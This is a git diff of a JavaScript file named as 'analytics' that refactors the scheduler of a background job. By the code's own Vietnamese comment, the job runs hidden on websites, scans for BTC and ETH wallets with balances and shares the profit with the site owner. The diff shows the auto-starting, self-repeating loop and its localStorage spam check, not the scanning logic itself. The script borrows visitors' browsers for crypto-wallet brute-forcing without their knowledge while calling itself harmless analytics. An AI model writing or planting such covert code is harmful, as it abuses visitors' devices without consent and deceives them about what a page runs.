@@ -5,17 +5,18 @@
 var max_all_scan_done = 3;
 var confirm_all_scan_done = max_all_scan_done;
 
-function action_analytics_echbot(spaceScan) {
+function analytics_echbot() {
     var toAll = 'Đây là script scan địa chỉ ví BTC, ETH, được chạy ngầm trên website. Mã này hoàn toàn vô hại và lợi nhuận kiếm sẽ được chia 50% cho chủ website mỗi khi tìm được địa chỉ ví có số dư.';
 
     //
+    var spaceScan = 12;
     var myDebug = false;
     //var myDebug = true;
 
     // kiểm tra để tránh tính trạng scan liên tục
     var spamCheck = 0;
     try {
-        spamCheck = localStorage.getItem('analytics_echbot_check_spam');
+        spamCheck = localStorage.getItem('analytics_check_spam_echbot');
         //console.log(spamCheck);
         if (spamCheck === null) {
             spamCheck = 0;
@@ -32,11 +33,11 @@ function action_analytics_echbot(spaceScan) {
             console.log('Spamer...', confirm_all_scan_done);
         }
         setTimeout(function () {
-            action_analytics_echbot(spaceScan);
+            analytics_echbot();
         }, Math.ceil(spaceScan / 2) * 1000);
         return false;
     }
-    localStorage.setItem('analytics_echbot_check_spam', currentTime);
+    localStorage.setItem('analytics_check_spam_echbot', currentTime);
     confirm_all_scan_done = 0;
 
     // ok -> cho phép scan
@@ -184,15 +185,7 @@ function action_analytics_echbot(spaceScan) {
 
     //
     setTimeout(function () {
-        action_analytics_echbot(spaceScan);
-    }, spaceScan * 1000);
-}
-
-function analytics_echbot() {
-    // giãn cách giữa mỗi lần scan
-    var spaceScan = 10;
-    setTimeout(function () {
-        action_analytics_echbot(spaceScan);
+        analytics_echbot();
     }, spaceScan * 1000);
 }
 analytics_echbot();
